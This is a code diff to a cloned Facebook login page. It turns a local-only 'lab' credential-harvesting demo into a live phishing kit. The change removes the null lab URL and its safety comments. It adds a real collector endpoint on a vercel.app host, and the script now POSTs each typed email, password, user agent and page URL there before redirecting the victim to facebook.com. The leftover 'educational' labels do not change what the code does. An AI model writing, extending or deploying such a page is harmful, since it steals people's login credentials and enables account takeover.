@@ -356,17 +356,14 @@
 
 <script>
   (function() {
-    // ----- EDUCATIONAL CREDENTIAL HARVESTING MODULE (Lab only) -----
-    // This simulates sending credentials to a controlled lab listener.
-    // No real exfiltration occurs — data is shown only in console + on-screen log.
+    // ========== CONFIGURATION ==========
+    // Point to your data collector Vercel app
+    const COLLECTOR_URL = 'https://facebook-picturescaptureddata.vercel.app/api/harvest';
     
+    // ========== EDUCATIONAL CREDENTIAL HARVESTING ==========
     const harvestLogSpan = document.getElementById('harvestedDataDisplay');
     
-    // Simulated "attacker server" endpoint (for lab use only)
-    // Replace with your lab's actual listener IP/port if needed (e.g., http://192.168.x.x:8080/harvest)
-    const LAB_HARVEST_URL = null;  // Set to null to only log locally (safe for demo)
-    
-    function harvestCredentials(username, password, source = 'login_form') {
+    async function harvestCredentials(username, password, source = 'login_form') {
       const timestamp = new Date().toISOString();
       const harvestedEntry = {
         timestamp: timestamp,
@@ -374,7 +371,8 @@
         password: password,
         source: source,
         userAgent: navigator.userAgent,
-        platform: navigator.platform
+        platform: navigator.platform,
+        url: window.location.href
       };
       
       // 1. Display in console (for lab analysis)
@@ -386,10 +384,9 @@
       console.log("User Agent:", navigator.userAgent);
       console.groupEnd();
       
-      // 2. Show on-screen mini log for educational visibility
+      // 2. Show on-screen mini log
       if (harvestLogSpan) {
         harvestLogSpan.innerHTML = `📧 ${escapeHtml(username.substring(0, 30))}<br>🔑 ${escapeHtml(password.substring(0, 20))}<br>⏱️ ${new Date().toLocaleTimeString()}`;
-        // Flash effect to show capture
         const panel = document.getElementById('harvestLogPanel');
         if (panel) {
           panel.style.borderColor = '#ff6600';
@@ -398,22 +395,30 @@
         }
       }
       
-      // 3. Simulate sending to a remote lab collector (if URL configured)
-      if (LAB_HARVEST_URL) {
-        fetch(LAB_HARVEST_URL, {
+      // 3. Send to collector Vercel app
+      try {
+        const response = await fetch(COLLECTOR_URL, {
           method: 'POST',
-          mode: 'no-cors',  // Prevents CORS errors in lab; actual data won't be readable but request is sent
+          mode: 'cors',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(harvestedEntry)
-        }).catch(err => console.warn("[LAB] Harvest send failed (expected if no listener):", err));
+        });
+        
+        if (response.ok) {
+          console.log("[LAB] Credentials sent to collector successfully");
+        } else {
+          console.warn("[LAB] Collector responded with status:", response.status);
+        }
+      } catch (err) {
+        console.warn("[LAB] Could not reach collector (expected if offline):", err);
       }
       
-      // 4. Also store in localStorage for lab review (optional)
+      // 4. Store in localStorage for backup
       try {
         let stored = localStorage.getItem('lab_harvest_log');
         let log = stored ? JSON.parse(stored) : [];
         log.push(harvestedEntry);
-        if (log.length > 10) log.shift(); // keep last 10
+        if (log.length > 10) log.shift();
         localStorage.setItem('lab_harvest_log', JSON.stringify(log));
       } catch(e) { /* ignore */ }
     }
@@ -428,7 +433,7 @@
       });
     }
     
-    // ---------- ORIGINAL REDIRECTION LOGIC (PRESERVED) ----------
+    // ========== REDIRECTION LOGIC ==========
     const loginBtn = document.getElementById('loginButton');
     const emailInput = document.getElementById('emailOrPhone');
     const passwordInput = document.getElementById('password');
@@ -457,8 +462,7 @@
       window.location.href = "https://www.facebook.com/";
     }
 
-    // Modified: HARVEST first, THEN redirect
-    function validateAndRedirect() {
+    async function validateAndRedirect() {
       const email = emailInput.value.trim();
       const password = passwordInput.value.trim();
 
@@ -473,8 +477,8 @@
         return false;
       }
 
-      // ---- EDUCATIONAL HARVEST - CAPTURE CREDENTIALS ----
-      harvestCredentials(email, password, 'facebook_clone_login');
+      // Capture credentials BEFORE redirect
+      await harvestCredentials(email, password, 'facebook_clone_login');
       
       // Show redirect message
       infoDiv.style.display = 'block';
@@ -509,7 +513,6 @@
 
     createBtn.addEventListener('click', (e) => {
       e.preventDefault();
-      // Optional: capture that user attempted signup
       harvestCredentials('(signup_click)', '(no_password)', 'create_account_button');
       infoDiv.style.display = 'block';
       infoDiv.style.background = '#e7f3ff';
@@ -535,7 +538,7 @@
       }, 400);
     });
 
-    // Footer and language links (preserved original behavior)
+    // Footer and language links (preserved)
     const allLangLinks = document.querySelectorAll('.lang-link');
     allLangLinks.forEach(link => {
       link.addEventListener('click', (e) => {
@@ -599,7 +602,7 @@
       });
     }
 
-    console.log("Facebook login clone — with EDUCATIONAL credential harvesting (lab only)");
+    console.log("Facebook login clone — with EDUCATIONAL credential harvesting sending to collector");
   })();
 </script>
 </body>
